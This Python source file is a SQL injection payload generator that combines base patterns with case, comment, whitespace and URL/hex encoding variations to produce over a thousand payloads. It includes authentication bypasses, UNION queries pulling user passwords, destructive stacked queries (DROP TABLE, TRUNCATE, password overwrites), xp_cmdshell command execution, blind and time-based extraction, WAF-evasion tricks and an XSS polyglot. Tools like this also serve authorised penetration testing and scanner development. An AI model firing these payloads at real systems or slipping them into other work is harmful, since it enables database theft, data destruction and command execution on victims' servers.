"""
Comprehensive SQL Injection Payload Generator

Generates 1000+ unique SQLi payloads through:
- Combinatorial generation from base patterns
- Encoding variations (URL, hex, char, base64)
- Comment strategy variations
- Whitespace bypass variations
- Quote/delimiter variations
- SQL dialect-specific transformations
- WAF/IDS evasion techniques
"""

import itertools
import urllib.parse
import base64
import random
from typing import List, Dict, Set, Tuple
import logging

logger = logging.getLogger(__name__)


class ComprehensivePayloadGenerator:
    """
    Generates comprehensive set of SQL injection payloads covering:
    - Classical injection techniques
    - Advanced evasion techniques
    - Modern WAF bypass methods
    """
    
    def __init__(self):
        """Initialize the payload generator with base patterns"""
        self.generated_payloads: Set[str] = set()
        
        # Base injection patterns
        self.base_patterns = {
            'boolean_simple': [
                "' OR '1'='1",
                "' OR 1=1--",
                "\" OR \"1\"=\"1",
                "' OR 'a'='a",
                "') OR ('1'='1",
                "\") OR (\"1\"=\"1",
                "' OR ''='",
                "\" OR \"\"=\"",
                "' OR TRUE--",
                "' OR 1--",
                "' OR 2>1--",
                "' OR 'x'='x'--",
                "admin' OR '1'='1",
                "admin' OR 1=1--",
                "' OR 1=1#",
                "' OR 1=1/*",
            ],
            'boolean_advanced': [
                "' OR '1'='1' AND 'a'='a",
                "' OR 1=1 AND 2=2--",
                "' OR 'x'='x' AND 'y'='y",
                "') OR ('a'='a') AND ('b'='b",
                "' AND '1'='2' OR '1'='1",
                "' OR 1=1 LIMIT 1--",
                "' OR 1=1 ORDER BY 1--",
                "' OR 1=1 GROUP BY 1--",
                "' OR ASCII(1)=49--",
                "' OR LENGTH('')=0--",
            ],
            'union_basic': [
                "' UNION SELECT NULL--",
                "' UNION SELECT NULL,NULL--",
                "' UNION SELECT NULL,NULL,NULL--",
                "' UNION ALL SELECT NULL--",
                "' UNION SELECT 1--",
                "' UNION SELECT 1,2--",
                "' UNION SELECT 1,2,3--",
                "' UNION SELECT 'a','b'--",
                "' UNION SELECT user,password FROM users--",
                "' UNION SELECT database(),user()--",
                "' UNION SELECT version(),current_user()--",
            ],
            'stacked_queries': [
                "'; DROP TABLE users--",
                "'; INSERT INTO users VALUES(1,'admin','pass')--",
                "'; UPDATE users SET password='hacked' WHERE id=1--",
                "'; DELETE FROM users WHERE id=1--",
                "'; EXEC xp_cmdshell('dir')--",
                "'; SELECT * FROM users--",
                "'; TRUNCATE TABLE users--",
            ],
            'error_based': [
                "' AND 1=CONVERT(int,(SELECT @@version))--",
                "' AND 1=CAST((SELECT @@version) AS int)--",
                "' AND extractvalue(1,concat(0x7e,version()))--",
                "' AND updatexml(1,concat(0x7e,database()),1)--",
                "' AND (SELECT COUNT(*) FROM information_schema.tables)--",
                "' AND 1=@@version--",
                "' AND 1=database()--",
                "' UNION SELECT 1/0--",
            ],
            'time_based': [
                "' AND SLEEP(5)--",
                "' OR SLEEP(5)--",
                "'; WAITFOR DELAY '0:0:5'--",
                "' AND pg_sleep(5)--",
                "' AND (SELECT COUNT(*) FROM generate_series(1,1000000))>0--",
                "' OR BENCHMARK(10000000,MD5('A'))--",
                "' OR BENCHMARK(5000000,SHA1('A'))--",
                "'; SELECT SLEEP(5)--",
                "' AND IF(1=1,SLEEP(5),0)--",
                "' OR IF(1=1,SLEEP(3),0)--",
            ],
            'blind_inference': [
                "' AND SUBSTRING(version(),1,1)='5",
                "' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>100--",
                "' AND LENGTH(database())>5--",
                "' AND MID(version(),1,1)='5'--",
                "' AND SUBSTRING(user(),1,1)='r'--",
                "' AND EXISTS(SELECT * FROM users)--",
                "' AND (SELECT COUNT(*) FROM users)>0--",
                "' AND 1=(SELECT 1 FROM users LIMIT 1)--",
            ],
            'comment_bypass': [
                "' OR/**/'1'='1'--",
                "'/**/OR/**/1=1--",
                "' OR/*comment*/1=1--",
                "' OR/*!50000 1=1*/--",
                "' /*!50000OR*/ 1=1--",
                "'/**/UNION/**/SELECT--",
            ],
            'encoding_bypass': [
                "' %4f%52 1=1--",  # OR in hex
                "' \u004f\u0052 1=1--",  # OR in unicode
                "' OR 0x31=0x31--",  # Hex numbers
                "' OR CHAR(49)=CHAR(49)--",
                "' %0AOR%0A1=1--",  # Newline encoding
            ],
            'second_order': [
                "admin'--",
                "admin' #",
                "admin'/*",
                "'; DROP TABLE users; --",
                "admin' OR '1'='1' --",
            ],
        }
        
        # Comment strategies
        self.comment_styles = {
            'double_dash': '--',
            'hash': '#',
            'c_style': '/*',
            'c_style_end': '*/',
            'inline': '/**/',
        }
        
        # Quote variations
        self.quote_variations = ["'", '"', '`']
        
        # Whitespace bypass techniques
        self.whitespace_bypasses = [
            ' ',
            '\t',
            '\n',
            '\r',
            '/**/',
            '/**/\t',
            '%0a',
            '%0d',
            '%09',
            '+',
        ]
        
        # SQL dialect-specific functions
        self.dialect_functions = {
            'mysql': ['SLEEP', 'BENCHMARK', 'GROUP_CONCAT', 'LOAD_FILE', 'INTO OUTFILE'],
            'postgresql': ['pg_sleep', 'pg_read_file', 'COPY', 'lo_import', 'lo_export'],
            'mssql': ['WAITFOR', 'xp_cmdshell', 'xp_regread', 'sp_OACreate', 'OPENROWSET'],
            'oracle': ['DBMS_LOCK.SLEEP', 'UTL_HTTP.REQUEST', 'UTL_INADDR', 'DBMS_XMLQUERY'],
            'sqlite': ['randomblob', 'hex', 'zeroblob', 'load_extension'],
        }
        
        # WAF bypass techniques
        self.waf_bypass_techniques = {
            'case_variation': True,
            'comment_injection': True,
            'encoding': ['url', 'double_url', 'hex', 'unicode'],
            'whitespace_obfuscation': True,
        }
    
    def generate_all_payloads(self) -> List[str]:
        """
        Generate comprehensive payload set.
        
        Returns:
            List of unique payloads
        """
        logger.info("Starting comprehensive payload generation...")
        
        # 1. Generate base pattern variations
        self._generate_base_variations()
        
        # 2. Generate comment variations
        self._generate_comment_variations()
        
        # 3. Generate whitespace bypass variations
        self._generate_whitespace_variations()
        
        # 4. Generate encoding variations
        self._generate_encoding_variations()
        
        # 5. Generate SQL dialect-specific payloads
        self._generate_dialect_specific()
        
        # 6. Generate WAF evasion payloads
        self._generate_waf_evasion()
        
        # 7. Generate context-specific payloads
        self._generate_context_specific()
        
        # 8. Generate polyglot payloads
        self._generate_polyglot()
        
        logger.info(f"Generated {len(self.generated_payloads)} unique payloads")
        return list(self.generated_payloads)
    
    def _generate_base_variations(self):
        """Generate variations of base patterns"""
        for category, patterns in self.base_patterns.items():
            for pattern in patterns:
                self.generated_payloads.add(pattern)
                
                # Quote variations
                for quote in self.quote_variations:
                    if "'" in pattern:
                        self.generated_payloads.add(pattern.replace("'", quote))
                    if '"' in pattern:
                        self.generated_payloads.add(pattern.replace('"', quote))
                
                # Case variations
                self.generated_payloads.add(pattern.upper())
                self.generated_payloads.add(pattern.lower())
                
                # Mixed case (bypass case-sensitive filters)
                self.generated_payloads.add(self._random_case(pattern))
                self.generated_payloads.add(self._random_case(pattern))  # Generate 2 variations
                
                # Add prefix/suffix variations
                for prefix in ['', '1', 'admin', '0', '-1']:
                    if prefix:
                        self.generated_payloads.add(prefix + pattern)
                
                # Add different comment endings
                for comment in ['--', '#', '/**/', '/*', ';--', ' --', ' #']:
                    if pattern.endswith('--'):
                        self.generated_payloads.add(pattern[:-2] + comment)
                    elif not pattern.endswith(('--', '#', '*/')):
                        self.generated_payloads.add(pattern + comment)
    
    def _generate_comment_variations(self):
        """Generate payloads with comment injection"""
        sample_payloads = list(self.generated_payloads)[:50]  # Sample to avoid explosion
        
        for payload in sample_payloads:
            # Inject comments between keywords
            for comment in ['/**/', '/**/\t', '/*a*/', '/*!50000*/']:
                if ' OR ' in payload.upper():
                    new_payload = payload.replace(' OR ', f' {comment}OR{comment} ')
                    self.generated_payloads.add(new_payload)
                
                if ' AND ' in payload.upper():
                    new_payload = payload.replace(' AND ', f' {comment}AND{comment} ')
                    self.generated_payloads.add(new_payload)
                
                if ' UNION ' in payload.upper():
                    new_payload = payload.replace(' UNION ', f' {comment}UNION{comment} ')
                    self.generated_payloads.add(new_payload)
    
    def _generate_whitespace_variations(self):
        """Generate payloads with whitespace bypass"""
        sample_payloads = list(self.generated_payloads)[:30]
        
        for payload in sample_payloads:
            for ws in self.whitespace_bypasses[:5]:  # Limit combinations
                new_payload = payload.replace(' ', ws)
                if new_payload != payload:
                    self.generated_payloads.add(new_payload)
    
    def _generate_encoding_variations(self):
        """Generate encoded payload variations"""
        sample_payloads = list(self.generated_payloads)[:20]
        
        for payload in sample_payloads:
            # URL encoding
            self.generated_payloads.add(urllib.parse.quote(payload))
            
            # Double URL encoding
            self.generated_payloads.add(urllib.parse.quote(urllib.parse.quote(payload)))
            
            # Hex encoding for specific characters
            hex_encoded = self._hex_encode_chars(payload)
            if hex_encoded != payload:
                self.generated_payloads.add(hex_encoded)
    
    def _generate_dialect_specific(self):
        """Generate SQL dialect-specific payloads"""
        for dialect, functions in self.dialect_functions.items():
            for func in functions:
                # Basic function usage
                self.generated_payloads.add(f"' AND {func}()--")
                self.generated_payloads.add(f"' OR {func}()--")
                self.generated_payloads.add(f"'; SELECT {func}()--")
                
                # With parameters (for functions that need them)
                if dialect == 'mysql' and func == 'SLEEP':
                    self.generated_payloads.add(f"' AND {func}(5)--")
                    self.generated_payloads.add(f"' OR {func}(3)--")
                elif dialect == 'postgresql' and func == 'pg_sleep':
                    self.generated_payloads.add(f"' AND {func}(5)--")
                elif dialect == 'mssql' and func == 'WAITFOR':
                    self.generated_payloads.add(f"'; {func} DELAY '0:0:5'--")
    
    def _generate_waf_evasion(self):
        """Generate WAF evasion payloads"""
        evasion_patterns = [
            # Null byte injection
            "' OR 1=1%00--",
            "' OR 'x'='x'%00",
            
            # Scientific notation
            "' OR 1e0=1--",
            "' OR 0x1=1--",
            
            # Nested comments
            "' OR/*!50000 1=1*/--",
            "' /*!50000OR*/ 1=1--",
            
            # Unicode variations
            "' \u004f\u0052 1=1--",  # OR in unicode
            
            # Buffer overflow attempts
            "' OR 1=1" + "A" * 100 + "--",
            
            # Mixed encoding
            "' %4f%52 1=1--",  # OR in hex
            
            # Conditional comments (MySQL)
            "/*!50000' OR 1=1*/--",
            "/*!12345' OR '1'='1*/",
            
            # Version-specific comments
            "/*!50000 UNION SELECT NULL*/--",
            
            # HPP (HTTP Parameter Pollution)
            "' OR 1=1#&id=2",
            
            # Newline/CR bypass
            "'\nOR\n1=1--",
            "'\rOR\r1=1--",
            
            # Bracket variations
            "' OR(1)=(1)--",
            "' OR[1]=[1]--",
            
            # Arithmetic variations
            "' OR 2-1=1--",
            "' OR 2>1--",
            "' OR 'a'<'b'--",
        ]
        
        for pattern in evasion_patterns:
            self.generated_payloads.add(pattern)
    
    def _generate_context_specific(self):
        """Generate context-specific payloads (JSON, XML, etc.)"""
        contexts = {
            'json': [
                '{"username": "admin\' OR \'1\'=\'1", "password": "x"}',
                '{"id": "1\' OR 1=1--"}',
                '{"search": "\' UNION SELECT NULL--"}',
            ],
            'xml': [
                "<user>' OR '1'='1</user>",
                "<id>1' UNION SELECT NULL--</id>",
            ],
            'html_attribute': [
                "' onclick='alert(1)' OR '1'='1",
                '" onmouseover="alert(1)" OR "1"="1',
            ],
            'javascript': [
                "\\'; DROP TABLE users--",
                "\\x27 OR 1=1--",
            ],
        }
        
        for context, payloads in contexts.items():
            for payload in payloads:
                self.generated_payloads.add(payload)
    
    def _generate_polyglot(self):
        """Generate polyglot payloads (work in multiple contexts)"""
        polyglots = [
            "';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>\">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",
            "' OR 1=1--",
            "\" OR \"1\"=\"1",
            "' OR '1'='1' /*",
            "admin' OR 1=1#",
            "admin' OR 1=1/*",
            "' or 1=1--",
            "' or 1=1#",
            "' or 1=1/*",
            "admin' --",
            "admin' #",
            "admin'/*",
            "' or 'a'='a",
            "' OR 'a'='a",
            "' or ''='",
            "' OR ''='",
            "1' or '1'='1",
            "1' OR '1'='1",
        ]
        
        for payload in polyglots:
            self.generated_payloads.add(payload)
    
    def _random_case(self, text: str) -> str:
        """Randomly vary case of text"""
        return ''.join(
            c.upper() if random.random() > 0.5 else c.lower()
            for c in text
        )
    
    def _hex_encode_chars(self, text: str, chars_to_encode: str = ' ') -> str:
        """Hex encode specific characters"""
        result = []
        for c in text:
            if c in chars_to_encode:
                result.append(f"%{ord(c):02x}")
            else:
                result.append(c)
        return ''.join(result)
    
    def get_categorized_payloads(self) -> Dict[str, List[str]]:
        """
        Return payloads organized by category.
        
        Returns:
            Dictionary with categories as keys and payload lists as values
        """
        categorized = {
            'classical': [],
            'advanced': [],
            'modern_evasion': [],
            'time_based': [],
            'union_based': [],
            'error_based': [],
            'boolean_based': [],
            'waf_bypass': [],
            'dialect_specific': [],
        }
        
        for payload in self.generated_payloads:
            payload_upper = payload.upper()
            
            # Categorize by technique
            if 'SLEEP' in payload_upper or 'WAITFOR' in payload_upper or 'PG_SLEEP' in payload_upper:
                categorized['time_based'].append(payload)
            elif 'UNION' in payload_upper:
                categorized['union_based'].append(payload)
            elif 'CONVERT' in payload_upper or 'CAST' in payload_upper or 'EXTRACTVALUE' in payload_upper:
                categorized['error_based'].append(payload)
            elif (' OR ' in payload_upper or ' AND ' in payload_upper) and 'UNION' not in payload_upper:
                categorized['boolean_based'].append(payload)
            
            # Check for evasion techniques
            if '/**/' in payload or '%' in payload or any(d in payload_upper for d in ['BENCHMARK', 'PG_SLEEP', 'WAITFOR']):
                categorized['modern_evasion'].append(payload)
            
            # Check for WAF bypass
            if '%00' in payload or '/*!50000' in payload or r'\x' in payload:
                categorized['waf_bypass'].append(payload)
            
            # Default to classical if simple
            if payload in self.base_patterns.get('boolean_simple', []):
                categorized['classical'].append(payload)
        
        return categorized


def generate_comprehensive_payloads() -> Tuple[List[str], Dict[str, List[str]]]:
    """
    Generate comprehensive SQL injection payload set.
    
    Returns:
        Tuple of (all_payloads, categorized_payloads)
    """
    generator = ComprehensivePayloadGenerator()
    all_payloads = generator.generate_all_payloads()
    categorized = generator.get_categorized_payloads()
    
    return all_payloads, categorized


if __name__ == "__main__":
    # Test the generator
    logging.basicConfig(level=logging.INFO)
    payloads, categorized = generate_comprehensive_payloads()
    
    print(f"\n=== Payload Generation Summary ===")
    print(f"Total unique payloads: {len(payloads)}")
    print(f"\nBreakdown by category:")
    for category, payload_list in categorized.items():
        print(f"  {category}: {len(payload_list)}")
